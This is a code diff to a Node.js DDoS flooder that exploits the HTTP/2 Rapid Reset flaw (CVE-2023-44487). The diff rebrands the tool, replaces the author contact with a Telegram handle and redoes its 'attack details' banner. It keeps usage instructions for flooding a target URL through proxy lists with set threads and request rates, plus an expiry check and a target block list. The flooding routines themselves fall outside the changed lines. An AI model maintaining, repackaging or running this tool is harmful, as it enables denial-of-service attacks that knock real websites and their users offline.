@@ -89,12 +89,13 @@ const debugMode = process.argv.includes('--debug') && forceHttp != 1;
 if (!reqmethod || !target || !time || !threads || !ratelimit || !proxyfile) {
     console.clear();
     console.error(`
-    [flooder - nodejs] tornado ${ver} (CVE-2023-44487) // Updated: 14.09.2024 // With love @rapidreset :3
-    Developers to method: dojdikmc - creator the first version // @rapidreset - more improves & options upgrade
-    How to use & example:
+    rapidreset ${ver} · CVE-2023-44487
+    Telegram: @fasthttps
+
+    Usage:
       node ${process.argv[1]} <GET/POST> <target> <time> <threads> <ratelimit> <proxyfile>
       node ${process.argv[1]} GET "https://target.com" 120 16 128 proxy.txt
-    
+
     Options:
       --query 1/2/3 - query string with rand ex 1 - ?cf__chl_tk 2 - ?fwfwfwfw 3 - ?q=fwfwwffw
       --delay <1-1000> - delay between requests 1-100 ms (optimal) default 1 ms
@@ -121,11 +122,11 @@ const url = new URL(target);
 const proxy = fs.readFileSync(proxyfile, 'utf8').replace(/\r/g, '').split('\n')
 
 if (currentDate > targetDate) {
-    console.error('[#1] The method is outdated refer to @rapidreset');
+    console.error('[#1] This build is outdated; contact @fasthttps');
     process.exit(1);
 }
 
-if (url.hostname.endsWith(blockedDomain)) {
+if (blockedDomain.some((suffix) => url.hostname.endsWith(suffix))) {
     console.log(`[#2] Blocked target: ${blockedDomain.join(', ')} is on the blacklist`);
     process.exit(1);
 }
@@ -826,22 +827,15 @@ function runMaster() {
 
     Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }))
     console.log(`
-
-⣰⣦⡀⠀⠀⠀⠀⠀⠀⠀⢠⡄⠀⠀⡰⣶⣲⣤⠀⠀⢰⡶⠀⣠⣴⣶⣶⣴⣒
-⢻⣿⡇⠀⠀⣤⣷⠀⠀⠀⣼⡇⠀⡟⡟⠉⠉⢻⣆⠀⢸⡇⠀⣿⣿⡇⠀⠀⠀
-⢨⣿⣇⠀⠀⢻⣿⠀⠀⢀⣿⠁⢸⡯⠀⠀⠀⢸⣿⠀⣺⡇⠀⠸⣿⣿⡿⠿⠛
-⠀⢿⣿⡀⢀⣾⢿⣦⠀⣼⡇⠀⠸⡇⠀⠀⠀⣸⡿⠀⣺⠅⠀⠀⣿⡇⠀⠀⠀
-⠀⠈⣿⣇⣾⠇⠈⣿⣿⡟⠀⠀⠀⠯⢶⣶⠾⠟⠁⠀⢿⣦⡶⠄⢹⠇⠀⠀⠀
-⠀⠀⠘⢿⠏⠀⠀⠈⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-
-> Attack Details:   
-> Version: [tornado - ${ver}]
-> ${Date().toLocaleString("us")}
-> Request Method: [${reqmethod}]
-> Target: [${target}]
-> Time: [${time} sec]
-> Threads: [${threads}x core]
-> Ratelimit: [${ratelimit} rq/s]
+  rapidreset ${ver} · CVE-2023-44487
+  Telegram: @fasthttps
+  ──────────────────────────────────────────
+  method     ${reqmethod}
+  target     ${target}
+  time       ${time}s
+  threads    ${threads}
+  ratelimit  ${ratelimit}/s
+  started    ${new Date().toLocaleString('en-GB')}
 `)
 
     function shutdownCluster() {
